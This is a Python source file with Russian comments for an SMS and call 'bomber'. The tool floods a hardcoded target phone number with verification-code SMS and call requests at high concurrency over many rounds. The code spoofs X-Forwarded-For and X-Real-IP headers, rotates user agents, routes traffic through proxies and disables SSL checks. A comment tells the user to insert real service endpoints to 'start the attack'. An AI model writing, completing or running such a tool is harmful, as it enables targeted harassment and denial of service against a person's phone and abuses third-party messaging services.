import asyncio
import aiohttp
import random
import string
import time
from dataclasses import dataclass, field
from typing import Callable, Literal

TARGET_PHONE = "+79612421307"
CONCURRENCY = 100
ROUNDS = 50


def _rand_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _normalize_phone(phone: str, with_plus: bool = False) -> str:
    digits = "".join(ch for ch in phone if ch.isdigit())
    return f"+{digits}" if with_plus else digits


OPERATORS = {
    "Билайн": ["903", "905", "906", "909", "960", "961", "962", "963", "964", "965", "966", "967", "968"],
    "МТС": ["910", "911", "912", "913", "914", "915", "916", "917", "918", "919", "980", "981", "982", "983", "984",
            "985", "986", "987", "988", "989"],
    "МегаФон": ["920", "921", "922", "923", "924", "925", "926", "927", "928", "929", "930", "931", "932", "933", "934",
                "936", "937", "938", "939"],
    "Tele2": ["900", "901", "902", "904", "908", "950", "951", "952", "953", "958", "977", "991", "992", "993", "994",
              "995", "996", "997", "998", "999"],
}


def get_operator(phone: str) -> str:
    clean = "".join(c for c in phone if c.isdigit())
    if len(clean) == 11 and clean[0] in ("7", "8"):
        prefix = clean[1:4]
        for op, prefixes in OPERATORS.items():
            if prefix in prefixes:
                return op
    return "Неизвестно"


def sms_json(phone: str) -> dict:
    return {"phone": _normalize_phone(phone), "text": "Код подтверждения", "nonce": _rand_str()}


def sms_form(phone: str) -> dict:
    return {"msisdn": _normalize_phone(phone), "message": "Код подтверждения"}


def call_json(phone: str) -> dict:
    return {"msisdn": _normalize_phone(phone), "action": "call"}


Kind = Literal["sms", "call"]


@dataclass
class Service:
    name: str
    kind: Kind
    url: str
    method: str
    build_payload: Callable[[str], dict]
    headers: dict = field(default_factory=dict)


# ВСТАВЬ СЮДА РЕАЛЬНЫЕ ЭНДПОИНТЫ (найденные через краулер или API-шлюзы)
SERVICES: list[Service] = [

]

PROXIES: list[str] = [
    # "http://user:pass@ip:port",
]


def _pick_proxy() -> str | None:
    return random.choice(PROXIES) if PROXIES else None


def _rand_ip() -> str:
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]


class Bomber:
    def __init__(self, phone: str, concurrency: int = 100, rounds: int = 50):
        self.phone = phone
        self.concurrency = concurrency
        self.rounds = rounds
        self.sem = asyncio.Semaphore(concurrency)
        self.ok = 0
        self.fail = 0
        self._lock = asyncio.Lock()

    async def _fire(self, session: aiohttp.ClientSession, svc: Service) -> None:
        async with self.sem:
            payload = svc.build_payload(self.phone)
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json, text/plain, */*",
                "X-Forwarded-For": _rand_ip(),
                "X-Real-IP": _rand_ip(),
                **svc.headers,
            }

            try:
                async with session.request(
                        svc.method, svc.url,
                        json=payload if svc.method == "POST" and "Content-Type" in svc.headers and "json" in
                                        svc.headers["Content-Type"] else None,
                        data=payload if svc.method == "POST" and "Content-Type" not in svc.headers or (
                                svc.method == "POST" and "form" in svc.headers.get("Content-Type", "")) else None,
                        params=payload if svc.method == "GET" else None,
                        headers=headers,
                        proxy=_pick_proxy(),
                        timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    async with self._lock:
                        if 200 <= resp.status < 300:
                            self.ok += 1
                        else:
                            self.fail += 1
            except Exception:
                async with self._lock:
                    self.fail += 1

    async def run(self) -> None:
        if not SERVICES:
            print(f"[!] Список SERVICES пуст.")
            print(f"[!] Цель: {self.phone} (Оператор: {get_operator(self.phone)})")
            print("[*] Добавь рабочие API эндпоинты в список SERVICES, чтобы начать атаку.")
            return

        print(f"[*] Цель: {self.phone} | Оператор: {get_operator(self.phone)}")
        print(f"[*] Потоков: {self.concurrency} | Раундов: {self.rounds} | Сервисов: {len(SERVICES)}")
        print("-" * 50)

        connector = aiohttp.TCPConnector(limit=self.concurrency * 2, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = time.time()
            for r in range(self.rounds):
                tasks = [
                    asyncio.create_task(self._fire(session, svc))
                    for svc in SERVICES
                    for _ in range(self.concurrency)
                ]
                await asyncio.gather(*tasks)

                elapsed = time.time() - start_time
                rps = (self.ok + self.fail) / elapsed if elapsed > 0 else 0
                print(f"[Round {r + 1}/{self.rounds}] OK: {self.ok} | FAIL: {self.fail} | RPS: {rps:.1f}")

        print("-" * 50)
        print(f"[+] Завершено. Всего OK: {self.ok} | Всего FAIL: {self.fail}")


if __name__ == "__main__":
    import sys

    # Фикс для Windows, чтобы asyncio не падал с ошибкой Event Loop
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    try:
        asyncio.run(Bomber(TARGET_PHONE, CONCURRENCY, ROUNDS).run())
    except KeyboardInterrupt:
        print("\n[!] Прервано пользователем.")